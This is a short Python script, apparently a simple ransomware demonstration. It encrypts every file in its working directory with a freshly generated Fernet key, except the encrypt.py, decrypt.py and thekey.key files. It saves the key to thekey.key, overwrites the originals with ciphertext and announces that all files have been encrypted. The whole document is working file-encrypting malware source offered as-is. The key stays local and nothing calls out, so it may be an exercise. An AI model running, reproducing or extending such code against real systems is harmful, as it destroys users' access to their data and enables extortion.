#Created by Andre Menezes
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#Finding files to encrypt
files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

#Generating the encryption key and saving it
#to thekey.key file
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#Editing the file to write the encrypted content
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All yours files have been encrypted")